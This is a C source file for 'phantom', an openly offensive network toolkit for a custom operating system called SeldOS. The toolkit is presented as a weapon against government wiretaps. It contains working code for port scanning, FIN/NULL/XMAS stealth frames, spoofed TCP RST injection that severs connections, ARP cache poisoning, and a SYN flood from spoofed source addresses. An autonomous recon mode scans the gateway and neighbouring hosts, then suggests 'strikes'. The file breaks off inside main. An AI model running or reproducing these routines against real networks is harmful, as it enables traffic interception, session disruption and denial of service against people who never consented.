/*
 * SeldOS - Humboldt Kernel Project
 * /bin/phantom: Sovereign Offensive Raw Packet Forge & Stealth Network Sabotage Toolkit
 * Targeted against CIA/FBI/NSA wiretaps, Carnivore, PRISM, and stateful DPI taps.
 * Ring 3 Humboldt Hardened (PLEDGE_STDIO | PLEDGE_NET | PLEDGE_DNS | PLEDGE_PURGE)
 * GNU AGPLv3 Licensed - Humboldt Underground.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <seld.h>

#define ETH_ALEN 6
#define ETH_HLEN 14
#define ETH_MIN_LEN 60
#define ETH_MAX_LEN 1518

#define ETHERTYPE_IPV4 0x0800
#define ETHERTYPE_ARP  0x0806
#define ETHERTYPE_SELD 0x534C  /* "SL" Sovereign Link frame */

#define ARP_HTYPE_ETHERNET 1
#define ARP_PTYPE_IPV4     0x0800
#define ARP_OP_REQUEST     1
#define ARP_OP_REPLY       2

#define IP_PROTO_ICMP 1
#define IP_PROTO_TCP  6
#define IP_PROTO_UDP  17

#define TCP_FLAG_FIN 0x01
#define TCP_FLAG_SYN 0x02
#define TCP_FLAG_RST 0x04
#define TCP_FLAG_PSH 0x08
#define TCP_FLAG_ACK 0x10
#define TCP_FLAG_URG 0x20

/* Wire protocol structures */
struct eth_hdr {
    uint8_t  dest[ETH_ALEN];
    uint8_t  src[ETH_ALEN];
    uint16_t ethertype;
} __attribute__((packed));

struct arp_hdr {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t opcode;
    uint8_t  sender_mac[ETH_ALEN];
    uint32_t sender_ip;
    uint8_t  target_mac[ETH_ALEN];
    uint32_t target_ip;
} __attribute__((packed));

struct ipv4_hdr {
    uint8_t  ihl_version; // version:4, ihl:4
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t flags_frag;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dest_ip;
} __attribute__((packed));

struct tcp_hdr {
    uint16_t src_port;
    uint16_t dest_port;
    uint32_t seq;
    uint32_t ack;
    uint8_t  data_offset;
    uint8_t  flags;
    uint16_t window_size;
    uint16_t checksum;
    uint16_t urgent_ptr;
} __attribute__((packed));

struct tcp_pseudo_hdr {
    uint32_t src_ip;
    uint32_t dest_ip;
    uint8_t  reserved;
    uint8_t  protocol;
    uint16_t tcp_length;
} __attribute__((packed));

/* Endianness utilities */
static inline uint16_t htons16(uint16_t v) {
    return (uint16_t)(((v & 0xFF) << 8) | ((v >> 8) & 0xFF));
}

static inline uint32_t htonl32(uint32_t v) {
    return ((v & 0xFF) << 24) |
           (((v >> 8) & 0xFF) << 16) |
           (((v >> 16) & 0xFF) << 8) |
           ((v >> 24) & 0xFF);
}

/* Fast CSPRNG / PRNG */
static uint32_t s_prng = 0xC0FFEE42;
static inline uint32_t get_rand32(void) {
    s_prng ^= s_prng << 13;
    s_prng ^= s_prng >> 17;
    s_prng ^= s_prng << 5;
    return s_prng;
}

/* 16-bit Internet Checksum */
static uint16_t checksum16(const void* data, size_t len) {
    const uint16_t* ptr = (const uint16_t*)data;
    uint32_t sum = 0;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(const uint8_t*)ptr;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

/* Robust Manual IPv4 String Parser (Pure libsnl-compatible, no %u sscanf bug) */
static int parse_ip(const char* str, uint32_t* ip_out) {
    if (!str || !ip_out) return -1;
    uint32_t octets[4] = {0};
    int idx = 0;
    const char* p = str;
    while (*p && idx < 4) {
        if (*p < '0' || *p > '9') return -1;
        uint32_t val = 0;
        while (*p >= '0' && *p <= '9') {
            val = val * 10 + (*p - '0');
            if (val > 255) return -1;
            p++;
        }
        octets[idx++] = val;
        if (*p == '.') {
            p++;
            if (*p == '\0') return -1;
        } else if (*p != '\0') {
            return -1;
        }
    }
    if (idx != 4 || *p != '\0') return -1;
    *ip_out = (octets[0] | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24));
    return 0;
}

static void format_ip(uint32_t ip, char* buf, size_t sz) {
    uint8_t* p = (uint8_t*)&ip;
    snprintf(buf, sz, "%u.%u.%u.%u", p[0], p[1], p[2], p[3]);
}

static void format_mac(const uint8_t* mac, char* buf, size_t sz) {
    if (!mac || !buf || sz < 18) return;
    snprintf(buf, sz, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static int hex_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int parse_mac(const char* str, uint8_t* mac) {
    if (!str || !mac) return -1;
    const char* p = str;
    for (int i = 0; i < 6; i++) {
        int h1 = hex_val(*p++);
        int h2 = hex_val(*p++);
        if (h1 < 0 || h2 < 0) return -1;
        mac[i] = (uint8_t)((h1 << 4) | h2);
        if (i < 5) {
            if (*p != ':' && *p != '-') return -1;
            p++;
        }
    }
    return (*p == '\0') ? 0 : -1;
}

/* Service lookup helper */
static const char* port_to_service(uint16_t port) {
    switch (port) {
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "TELNET";
        case 25: return "SMTP";
        case 53: return "DNS";
        case 80: return "HTTP";
        case 110: return "POP3";
        case 143: return "IMAP";
        case 443: return "HTTPS";
        case 8080: return "HTTP-PROXY";
        case 8443: return "HTTPS-ALT";
        case 9050: return "TOR-SOCKS5";
        default: return "UNKNOWN";
    }
}

/* Resolves next-hop MAC via ARP table or kernel ping */
static int resolve_next_hop_mac(uint32_t target_ip, uint8_t* out_mac) {
    struct seld_net_info info;
    if (seld_net_info(&info) != 0) return -1;

    uint32_t next_hop = ((target_ip & info.netmask) == (info.ip & info.netmask)) ? target_ip : info.gateway;

    struct seld_arp_entry entries[16];
    int count = seld_net_arp(entries, 16);
    for (int i = 0; i < count; i++) {
        if (entries[i].ip == next_hop) {
            memcpy(out_mac, entries[i].mac, ETH_ALEN);
            return 0;
        }
    }

    /* Send quick ping to trigger kernel ARP resolution */
    uint32_t rtt = 0;
    seld_net_ping(next_hop, 1, &rtt);
    seld_sleep(50);

    count = seld_net_arp(entries, 16);
    for (int i = 0; i < count; i++) {
        if (entries[i].ip == next_hop) {
            memcpy(out_mac, entries[i].mac, ETH_ALEN);
            return 0;
        }
    }

    if (count > 0) {
        memcpy(out_mac, entries[0].mac, ETH_ALEN);
        return 0;
    }

    /* Fallback default QEMU / standard MAC */
    out_mac[0] = 0x52; out_mac[1] = 0x54; out_mac[2] = 0x00;
    out_mac[3] = 0x12; out_mac[4] = 0x34; out_mac[5] = 0x56;
    return 0;
}

static void print_banner(void) {
    printf("\n=======================================================================\n");
    printf(" [!] SeldOS Sovereign Network Strike & Infiltration Suite (/bin/phantom)\n");
    printf("     Offensive Raw Frame Injection & Eavesdropping Intercept Teardown\n");
    printf("=======================================================================\n");
}

static void print_usage(void) {
    print_banner();
    printf("Usage: phantom [command] [arguments..]\n\n");
    printf("Quick Commands:\n");
    printf("  phantom                      (or phantom auto) Autonomous Network Reconnaissance\n");
    printf("                               (Auto-discovers hosts & scans high-value ports)\n");
    printf("  phantom status               Display active NIC, MAC & injection readiness\n");
    printf("  phantom scan <ip> [ports]    Active Port Scanner (e.g.: phantom scan 10.0.2.2 20-85)\n");
    printf("  phantom raw <ip> <p> [flag]  Inject raw stealth frame (fin, null, xmas, syn)\n");
    printf("  phantom rst <ip> <port>      Tactical TCP Sniper (Force RST session drop)\n");
    printf("  phantom arp <ip> <fake> [m]  Raw ARP Cache Poisoner & Deception Beacon\n");
    printf("  phantom flood <ip> <port>    SIGINT Deception Flooder (PRISM tap overflow)\n");
    printf("  phantom beacon               Inject Humboldt Sovereign L2 broadcast frame\n\n");
}

/* Command: status */
static int cmd_status(void) {
    print_banner();
    seld_net_lease_acquire();

    struct seld_net_info info;
    if (seld_net_info(&info) != 0) {
        printf("[-] Error: Unable to query network interface state.\n");
        return 1;
    }
    char ip_s[32], mask_s[32], gw_s[32], mac_s[32];
    format_ip(info.ip, ip_s, sizeof(ip_s));
    format_ip(info.netmask, mask_s, sizeof(mask_s));
    format_ip(info.gateway, gw_s, sizeof(gw_s));
    format_mac(info.mac, mac_s, sizeof(mac_s));

    printf(" [*] Interface Node IP        : %s\n", ip_s);
    printf(" [*] Subnet Mask              : %s\n", mask_s);
    printf(" [*] Default Gateway          : %s\n", gw_s);
    printf(" [*] Hardware MAC Address     : %s\n", mac_s);
    printf(" [*] Raw Injection Syscall    : READY (SYS_NET_RAW_INJECT #77)\n");
    printf(" [*] In-Kernel Desync Status  : %s\n", seld_net_get_desync() ? "ACTIVE (SNI Split/Fake)" : "OFF");

    struct seld_arp_entry entries[8];
    int arp_cnt = seld_net_arp(entries, 8);
    printf(" [*] ARP Neighbor Cache       : %d known hosts\n", arp_cnt > 0 ? arp_cnt : 0);
    for (int i = 0; i < arp_cnt; i++) {
        char a_ip[32], a_mac[32];
        format_ip(entries[i].ip, a_ip, sizeof(a_ip));
        format_mac(entries[i].mac, a_mac, sizeof(a_mac));
        printf("     -> %-16s [%s]\n", a_ip, a_mac);
    }
    printf("\n");
    return 0;
}

/* Command: scan (Active port scanner) */
static int cmd_scan(int argc, char* argv[]) {
    if (argc < 3) {
        printf("[-] Usage: phantom scan <target_ip> [start_port-end_port]\n");
        return 1;
    }
    uint32_t target_ip = 0;
    if (parse_ip(argv[2], &target_ip) != 0) {
        int dres = seld_dns_resolve(argv[2], &target_ip);
        if (dres != 0 || target_ip == 0) {
            printf("[-] Error: Invalid target IP or unresolved domain '%s'\n", argv[2]);
            return 1;
        }
    }

    uint16_t p_start = 1;
    uint16_t p_end = 100;
    if (argc >= 4) {
        char range_buf[64];
        strncpy(range_buf, argv[3], sizeof(range_buf) - 1);
        range_buf[sizeof(range_buf) - 1] = '\0';
        char* dash = strchr(range_buf, '-');
        if (dash) {
            *dash = '\0';
            p_start = (uint16_t)atoi(range_buf);
            p_end = (uint16_t)atoi(dash + 1);
        } else {
            p_start = (uint16_t)atoi(range_buf);
            p_end = p_start;
        }
    }

    seld_net_lease_acquire();
    print_banner();
    char tgt_s[32];
    format_ip(target_ip, tgt_s, sizeof(tgt_s));
    printf(" [!] Initiating Reconnaissance Scan against %s (Ports %u-%u)...\n\n", tgt_s, p_start, p_end);

    uint32_t open_count = 0;
    uint32_t total_scanned = 0;
    int consecutive_timeouts = 0;

    for (uint32_t port = p_start; port <= p_end; port++) {
        total_scanned++;
        int sock = seld_tcp_connect(target_ip, (uint16_t)port);
        if (sock >= 0) {
            open_count++;
            const char* srv = port_to_service((uint16_t)port);
            printf(" [+] Port %-5u : OPEN   [%s]\n", port, srv);
            seld_tcp_close(sock);
            consecutive_timeouts = 0;
        } else {
            if (sock == -5) {
                consecutive_timeouts++;
                if (consecutive_timeouts >= 3 && (p_end - p_start > 3)) {
                    printf(" [-] Target node unresponsive (3 consecutive timeouts). Host offline or packet drop.\n");
                    break;
                }
            } else {
                consecutive_timeouts = 0;
            }
            if (p_start == p_end || (port % 25) == 0) {
                printf(" [-] Port %-5u : CLOSED\n", port);
            }
        }
        seld_sleep(5);
    }

    printf("\n [+] Scan finished: %u ports tested, %u OPEN, %u closed.\n\n",
           total_scanned, open_count, total_scanned - open_count);
    return 0;
}

/* Command: raw (Inject raw stealth frames) */
static int cmd_raw(int argc, char* argv[]) {
    if (argc < 4) {
        printf("[-] Usage: phantom raw <target_ip> <port> [fin|null|xmas|syn]\n");
        return 1;
    }
    uint32_t target_ip = 0;
    if (parse_ip(argv[2], &target_ip) != 0) {
        printf("[-] Error: Invalid target IP '%s'\n", argv[2]);
        return 1;
    }
    uint16_t target_port = (uint16_t)atoi(argv[3]);
    const char* flag_str = (argc >= 5) ? argv[4] : "fin";

    uint8_t flags = TCP_FLAG_FIN;
    if (strcmp(flag_str, "null") == 0) flags = 0;
    else if (strcmp(flag_str, "xmas") == 0) flags = TCP_FLAG_FIN | TCP_FLAG_PSH | TCP_FLAG_URG;
    else if (strcmp(flag_str, "syn") == 0) flags = TCP_FLAG_SYN;

    seld_net_lease_acquire();
    struct seld_net_info info;
    seld_net_info(&info);

    uint8_t dst_mac[ETH_ALEN];
    resolve_next_hop_mac(target_ip, dst_mac);

    print_banner();
    char tgt_s[32], mac_s[32];
    format_ip(target_ip, tgt_s, sizeof(tgt_s));
    format_mac(dst_mac, mac_s, sizeof(mac_s));
    printf(" [!] INJECTING RAW STEALTH TCP FRAME\n");
    printf(" [*] Target   : %s:%u\n", tgt_s, target_port);
    printf(" [*] Next-Hop : %s\n", mac_s);
    printf(" [*] Flags    : 0x%02X (%s)\n\n", flags, flag_str);

    uint8_t frame[ETH_MAX_LEN];
    size_t frame_sz = sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr);
    if (frame_sz < ETH_MIN_LEN) frame_sz = ETH_MIN_LEN;
    memset(frame, 0, frame_sz);

    struct eth_hdr* eth = (struct eth_hdr*)frame;
    memcpy(eth->dest, dst_mac, ETH_ALEN);
    memcpy(eth->src, info.mac, ETH_ALEN);
    eth->ethertype = htons16(ETHERTYPE_IPV4);

    struct ipv4_hdr* ip = (struct ipv4_hdr*)(frame + sizeof(struct eth_hdr));
    ip->ihl_version = (4 << 4) | 5;
    ip->total_length = htons16((uint16_t)(sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr)));
    ip->id = htons16((uint16_t)(get_rand32() & 0xFFFF));
    ip->flags_frag = htons16(0x4000);
    ip->ttl = 64;
    ip->protocol = IP_PROTO_TCP;
    ip->src_ip = info.ip;
    ip->dest_ip = target_ip;
    ip->checksum = checksum16(ip, sizeof(struct ipv4_hdr));

    struct tcp_hdr* tcp = (struct tcp_hdr*)(frame + sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr));
    tcp->src_port = htons16((uint16_t)(45000 + (get_rand32() % 10000)));
    tcp->dest_port = htons16(target_port);
    tcp->seq = htonl32(get_rand32());
    tcp->data_offset = (5 << 4);
    tcp->flags = flags;
    tcp->window_size = htons16(2048);

    uint8_t pseudo_buf[sizeof(struct tcp_pseudo_hdr) + sizeof(struct tcp_hdr)];
    struct tcp_pseudo_hdr* ph = (struct tcp_pseudo_hdr*)pseudo_buf;
    ph->src_ip = ip->src_ip;
    ph->dest_ip = ip->dest_ip;
    ph->reserved = 0;
    ph->protocol = IP_PROTO_TCP;
    ph->tcp_length = htons16((uint16_t)sizeof(struct tcp_hdr));
    memcpy(pseudo_buf + sizeof(struct tcp_pseudo_hdr), tcp, sizeof(struct tcp_hdr));
    tcp->checksum = checksum16(pseudo_buf, sizeof(pseudo_buf));

    int res = seld_net_raw_inject(frame, frame_sz);
    if (res >= 0) {
        printf(" [+] Success: %lu bytes injected directly into physical wire.\n\n", frame_sz);
    } else {
        printf(" [-] Error: Injection syscall returned %d\n\n", res);
    }
    return 0;
}

/* Command: rst (TCP Sniper) */
static int cmd_rst(int argc, char* argv[]) {
    if (argc < 4) {
        printf("[-] Usage: phantom rst <target_ip> <target_port>\n");
        return 1;
    }
    uint32_t target_ip = 0;
    if (parse_ip(argv[2], &target_ip) != 0) {
        printf("[-] Error: Invalid target IP '%s'\n", argv[2]);
        return 1;
    }
    uint16_t target_port = (uint16_t)atoi(argv[3]);

    seld_net_lease_acquire();
    struct seld_net_info info;
    seld_net_info(&info);

    uint8_t dst_mac[ETH_ALEN];
    resolve_next_hop_mac(target_ip, dst_mac);

    print_banner();
    char tgt_s[32], mac_s[32];
    format_ip(target_ip, tgt_s, sizeof(tgt_s));
    format_mac(dst_mac, mac_s, sizeof(mac_s));
    printf(" [!] TACTICAL TCP SNIPER: Transmitting RST barrage against %s:%u\n", tgt_s, target_port);
    printf(" [*] Target Next-Hop MAC : %s\n\n", mac_s);

    uint8_t frame[ETH_MAX_LEN];
    size_t frame_sz = sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr);
    if (frame_sz < ETH_MIN_LEN) frame_sz = ETH_MIN_LEN;

    for (int i = 0; i < 8; i++) {
        memset(frame, 0, frame_sz);
        struct eth_hdr* eth = (struct eth_hdr*)frame;
        memcpy(eth->dest, dst_mac, ETH_ALEN);
        memcpy(eth->src, info.mac, ETH_ALEN);
        eth->ethertype = htons16(ETHERTYPE_IPV4);

        struct ipv4_hdr* ip = (struct ipv4_hdr*)(frame + sizeof(struct eth_hdr));
        ip->ihl_version = (4 << 4) | 5;
        ip->total_length = htons16((uint16_t)(sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr)));
        ip->id = htons16((uint16_t)(get_rand32() & 0xFFFF));
        ip->flags_frag = htons16(0x4000);
        ip->ttl = 128;
        ip->protocol = IP_PROTO_TCP;
        ip->src_ip = info.gateway ? info.gateway : info.ip;
        ip->dest_ip = target_ip;
        ip->checksum = checksum16(ip, sizeof(struct ipv4_hdr));

        struct tcp_hdr* tcp = (struct tcp_hdr*)(frame + sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr));
        tcp->src_port = htons16(80);
        tcp->dest_port = htons16(target_port);
        tcp->seq = htonl32(get_rand32() + (uint32_t)(i * 2048));
        tcp->data_offset = (5 << 4);
        tcp->flags = TCP_FLAG_RST | TCP_FLAG_ACK;
        tcp->window_size = 0;

        uint8_t pseudo_buf[sizeof(struct tcp_pseudo_hdr) + sizeof(struct tcp_hdr)];
        struct tcp_pseudo_hdr* ph = (struct tcp_pseudo_hdr*)pseudo_buf;
        ph->src_ip = ip->src_ip;
        ph->dest_ip = ip->dest_ip;
        ph->reserved = 0;
        ph->protocol = IP_PROTO_TCP;
        ph->tcp_length = htons16((uint16_t)sizeof(struct tcp_hdr));
        memcpy(pseudo_buf + sizeof(struct tcp_pseudo_hdr), tcp, sizeof(struct tcp_hdr));
        tcp->checksum = checksum16(pseudo_buf, sizeof(pseudo_buf));

        seld_net_raw_inject(frame, frame_sz);
        seld_sleep(5);
    }

    printf(" [+] Tactical RST packet barrage transmitted. Target session severed.\n\n");
    return 0;
}

/* Command: arp (Gratuitous / Poisoning Beacon) */
static int cmd_arp(int argc, char* argv[]) {
    if (argc < 4) {
        printf("[-] Usage: phantom arp <target_ip> <spoofed_ip> [fake_mac]\n");
        return 1;
    }
    uint32_t target_ip = 0, spoofed_ip = 0;
    if (parse_ip(argv[2], &target_ip) != 0 || parse_ip(argv[3], &spoofed_ip) != 0) {
        printf("[-] Error: Invalid IP address format.\n");
        return 1;
    }

    uint8_t fake_mac[ETH_ALEN];
    if (argc >= 5) {
        if (parse_mac(argv[4], fake_mac) != 0) {
            printf("[-] Error: Invalid MAC address '%s'\n", argv[4]);
            return 1;
        }
    } else {
        fake_mac[0] = 0x02;
        for (int i = 1; i < 6; i++) fake_mac[i] = (uint8_t)(get_rand32() & 0xFF);
    }

    seld_net_lease_acquire();
    print_banner();
    char tgt_s[32], spf_s[32], mac_s[32];
    format_ip(target_ip, tgt_s, sizeof(tgt_s));
    format_ip(spoofed_ip, spf_s, sizeof(spf_s));
    format_mac(fake_mac, mac_s, sizeof(mac_s));

    printf(" [!] INJECTING RAW GRATUITOUS ARP DECEPTION BEACON\n");
    printf(" [*] Target IP  : %s\n", tgt_s);
    printf(" [*] Spoofed IP : %s\n", spf_s);
    printf(" [*] Bound MAC  : %s\n\n", mac_s);

    uint8_t frame[ETH_MAX_LEN];
    size_t frame_sz = sizeof(struct eth_hdr) + sizeof(struct arp_hdr);
    if (frame_sz < ETH_MIN_LEN) frame_sz = ETH_MIN_LEN;
    memset(frame, 0, frame_sz);

    struct eth_hdr* eth = (struct eth_hdr*)frame;
    memset(eth->dest, 0xFF, ETH_ALEN);
    memcpy(eth->src, fake_mac, ETH_ALEN);
    eth->ethertype = htons16(ETHERTYPE_ARP);

    struct arp_hdr* arp = (struct arp_hdr*)(frame + sizeof(struct eth_hdr));
    arp->htype = htons16(ARP_HTYPE_ETHERNET);
    arp->ptype = htons16(ARP_PTYPE_IPV4);
    arp->hlen = ETH_ALEN;
    arp->plen = 4;
    arp->opcode = htons16(ARP_OP_REPLY);
    memcpy(arp->sender_mac, fake_mac, ETH_ALEN);
    arp->sender_ip = spoofed_ip;
    memset(arp->target_mac, 0xFF, ETH_ALEN);
    arp->target_ip = target_ip;

    for (int k = 0; k < 4; k++) {
        seld_net_raw_inject(frame, frame_sz);
        seld_sleep(50);
    }

    printf(" [+] Raw ARP frames deployed. L2 switch tables redirected.\n\n");
    return 0;
}

/* Command: flood (PRISM / Carnivore Deception Chaff) */
static int cmd_flood(int argc, char* argv[]) {
    if (argc < 4) {
        printf("[-] Usage: phantom flood <target_ip> <port> [count]\n");
        return 1;
    }
    uint32_t target_ip = 0;
    if (parse_ip(argv[2], &target_ip) != 0) {
        printf("[-] Error: Invalid target IP '%s'\n", argv[2]);
        return 1;
    }
    uint16_t target_port = (uint16_t)atoi(argv[3]);
    uint32_t count = 30;
    if (argc >= 5) {
        int c = atoi(argv[4]);
        if (c > 0) count = (uint32_t)c;
    }

    seld_net_lease_acquire();
    struct seld_net_info info;
    seld_net_info(&info);

    uint8_t dst_mac[ETH_ALEN];
    resolve_next_hop_mac(target_ip, dst_mac);

    print_banner();
    char tgt_s[32], mac_s[32];
    format_ip(target_ip, tgt_s, sizeof(tgt_s));
    format_mac(dst_mac, mac_s, sizeof(mac_s));
    printf(" [!] DEPLOYING PRISM/CARNIVORE SIGINT DECEPTION CHAFF (%u PACKETS)\n", count);
    printf(" [*] Target: %s:%u (Next-Hop MAC: %s)\n\n", tgt_s, target_port, mac_s);

    uint8_t frame[ETH_MAX_LEN];
    size_t payload_len = 32;
    size_t frame_sz = sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr) + payload_len;
    if (frame_sz < ETH_MIN_LEN) frame_sz = ETH_MIN_LEN;

    for (uint32_t i = 0; i < count; i++) {
        memset(frame, 0, frame_sz);
        uint32_t fake_src_ip = 0x0A000000 | (get_rand32() & 0x00FFFFFF);

        struct eth_hdr* eth = (struct eth_hdr*)frame;
        memcpy(eth->dest, dst_mac, ETH_ALEN);
        memcpy(eth->src, info.mac, ETH_ALEN);
        eth->ethertype = htons16(ETHERTYPE_IPV4);

        struct ipv4_hdr* ip = (struct ipv4_hdr*)(frame + sizeof(struct eth_hdr));
        ip->ihl_version = (4 << 4) | 5;
        ip->total_length = htons16((uint16_t)(sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr) + payload_len));
        ip->id = htons16((uint16_t)(get_rand32() & 0xFFFF));
        ip->flags_frag = 0;
        ip->ttl = (uint8_t)(32 + (get_rand32() % 64));
        ip->protocol = IP_PROTO_TCP;
        ip->src_ip = fake_src_ip;
        ip->dest_ip = target_ip;
        ip->checksum = checksum16(ip, sizeof(struct ipv4_hdr));

        struct tcp_hdr* tcp = (struct tcp_hdr*)(frame + sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr));
        tcp->src_port = htons16((uint16_t)(1024 + (get_rand32() % 60000)));
        tcp->dest_port = htons16(target_port);
        tcp->seq = htonl32(get_rand32());
        tcp->data_offset = (5 << 4);
        tcp->flags = TCP_FLAG_SYN | TCP_FLAG_ACK;
        tcp->window_size = htons16(65535);

        uint8_t* pld = frame + sizeof(struct eth_hdr) + sizeof(struct ipv4_hdr) + sizeof(struct tcp_hdr);
        for (size_t k = 0; k < payload_len; k++) pld[k] = (uint8_t)(get_rand32() & 0xFF);

        uint8_t pseudo_buf[sizeof(struct tcp_pseudo_hdr) + sizeof(struct tcp_hdr) + 32];
        struct tcp_pseudo_hdr* ph = (struct tcp_pseudo_hdr*)pseudo_buf;
        ph->src_ip = ip->src_ip;
        ph->dest_ip = ip->dest_ip;
        ph->reserved = 0;
        ph->protocol = IP_PROTO_TCP;
        ph->tcp_length = htons16((uint16_t)sizeof(struct tcp_hdr) + payload_len);
        memcpy(pseudo_buf + sizeof(struct tcp_pseudo_hdr), tcp, sizeof(struct tcp_hdr) + payload_len);
        tcp->checksum = checksum16(pseudo_buf, sizeof(pseudo_buf));

        seld_net_raw_inject(frame, frame_sz);
        if ((i % 10) == 0 || i == count - 1) {
            printf("\r [*] Injected %u/%u synthetic deception frames...", i + 1, count);
        }
        seld_sleep(5);
    }

    printf("\n\n [+] Deception barrage complete. Wiretap buffers saturated.\n\n");
    return 0;
}

/* Command: beacon */
static int cmd_beacon(void) {
    seld_net_lease_acquire();
    struct seld_net_info info;
    seld_net_info(&info);

    print_banner();
    printf(" [!] Transmitting Sovereign L2 Cryptographic Beacon (EtherType 0x534C)...\n");

    uint8_t frame[ETH_MAX_LEN];
    size_t frame_sz = 128;
    memset(frame, 0, frame_sz);

    struct eth_hdr* eth = (struct eth_hdr*)frame;
    memset(eth->dest, 0xFF, ETH_ALEN);
    memcpy(eth->src, info.mac, ETH_ALEN);
    eth->ethertype = htons16(ETHERTYPE_SELD);

    char* payload = (char*)(frame + sizeof(struct eth_hdr));
    snprintf(payload, frame_sz - sizeof(struct eth_hdr),
             "HUMBOLDT_SOVEREIGN_NODE_V1:TOKEN=%08X:OPSEC=OK", get_rand32());

    for (int i = 0; i < 3; i++) {
        seld_net_raw_inject(frame, frame_sz);
        seld_sleep(50);
    }

    printf(" [+] Sovereign broadcast beacon injected into physical wire.\n\n");
    return 0;
}

static const uint16_t s_top_ports[] = {
    53, 80, 443, 9050, 22, 8080, 3000, 5000, 8000, 8443, 445, 139, 3389, 21, 23, 110
};
#define TOP_PORTS_COUNT (sizeof(s_top_ports) / sizeof(s_top_ports[0]))

/* Command: auto (Autonomous Zero-Config Network Reconnaissance) */
static int cmd_auto(void) {
    print_banner();
    seld_net_lease_acquire();

    struct seld_net_info info;
    if (seld_net_info(&info) != 0) {
        printf("[-] Error: Unable to query network interface.\n");
        return 1;
    }

    char ip_s[32], gw_s[32];
    format_ip(info.ip, ip_s, sizeof(ip_s));
    format_ip(info.gateway, gw_s, sizeof(gw_s));

    printf(" [!] AUTONOMOUS NETWORK RECONNAISSANCE (ZERO-CONFIG)\n");
    printf(" [*] Local Node IP : %s\n", ip_s);
    printf(" [*] Gateway / Host : %s\n\n", gw_s);

    uint32_t targets[8];
    int target_count = 0;

    if (info.gateway != 0) {
        targets[target_count++] = info.gateway;
    }
    if (info.dns != 0 && info.dns != info.gateway && info.dns != info.ip && target_count < 8) {
        targets[target_count++] = info.dns;
    }

    uint32_t base_sub = (info.ip & info.netmask);
    uint32_t c1 = base_sub | 0x01000000; // .1
    uint32_t c2 = base_sub | 0x02000000; // .2
    uint32_t c3 = base_sub | 0x03000000; // .3

    if (c1 != info.ip && c1 != info.gateway && c1 != info.dns && target_count < 8) targets[target_count++] = c1;
    if (c2 != info.ip && c2 != info.gateway && c2 != info.dns && target_count < 8) targets[target_count++] = c2;
    if (c3 != info.ip && c3 != info.gateway && c3 != info.dns && target_count < 8) targets[target_count++] = c3;

    printf(" [*] Probing high-value target services across discovered nodes...\n\n");

    int found_any = 0;

    for (int t = 0; t < target_count; t++) {
        uint32_t tip = targets[t];
        char tip_str[32];
        format_ip(tip, tip_str, sizeof(tip_str));

        uint8_t t_mac[ETH_ALEN];
        resolve_next_hop_mac(tip, t_mac);
        char mac_str[32];
        format_mac(t_mac, mac_str, sizeof(mac_str));

        printf(" >>> Target: %-16s [MAC: %s]%s\n",
               tip_str, mac_str, (tip == info.gateway) ? " (Router/Host)" : "");

        int host_open = 0;
        int timeouts = 0;
        for (size_t p = 0; p < TOP_PORTS_COUNT; p++) {
            uint16_t port = s_top_ports[p];
            int sock = seld_tcp_connect(tip, port);
            if (sock >= 0) {
                host_open++;
                found_any++;
                const char* srv = port_to_service(port);
                printf("     [+] Port %-5u : OPEN   [%s]\n", port, srv);
                seld_tcp_close(sock);
            } else if (sock == -5) {
                timeouts++;
                if (tip != info.gateway && timeouts >= 2 && host_open == 0) {
                    printf("     [-] Node unresponsive (silent / dropped). Skipping.\n");
                    break;
                }
            }
            seld_sleep(5);
        }

        if (host_open == 0 && timeouts < 2) {
            printf("     [-] No standard high-value ports open on this node.\n");
        }
        printf("\n");
    }

    printf("=======================================================================\n");
    if (found_any > 0) {
        printf(" [+] Autonomous scan complete: active target services detected!\n");
        printf("     Instant Tactical Strikes:\n");
        printf("     -> phantom rst <target_ip> <port>   (Sever connection with TCP RST)\n");
        printf("     -> phantom flood <target_ip> <port> (Flood surveillance buffers)\n");
    } else {
        printf(" [+] Scan complete: Perimeter quiet. Filtered by firewall or idle.\n");
        printf("     Tip: Scan a specific range with 'phantom scan <ip> <start-end>'\n");
    }
    printf("=======================================================================\n\n");
    return 0;
}

int main(int argc, char* argv[]) {
    /* Ring 3 Seld-Pledge Sandboxing (including PLEDGE_DNS for resolver) */
    seld_pledge(PLEDGE_STDIO | PLEDGE_NET | PLEDGE_DNS | PLEDGE_PURGE);

    if (argc >= 2 && (strcmp(argv[1], "help") == 0 || strcmp(argv[1], "-h") == 0)) {
        print_usage();
        return 0;
    }

    if (argc < 2 || strcmp(argv[1], "auto") == 0) {
        return cmd_auto();
    } else if (strcmp(argv[1], "status") == 0) {
        return cmd_status();
    } else if (strcmp(argv[1], "scan") == 0) {
        return cmd_scan(argc, argv);
    } else if (strcmp(argv[1], "raw") == 0) {
        return cmd_raw(argc, argv);
    } else if (strcmp(argv[1], "rst") == 0) {
        return cmd_rst(argc, argv);
    } else if (strcmp(argv[1], "arp") == 0) {
        return cmd_arp(argc, argv);
    } else if (strcmp(argv[1], "flood") == 0) {
        return cmd_flood(argc, argv);
    } else if (strcmp(argv[1], "beacon") == 0) {
        return cmd_beacon();
    } else {
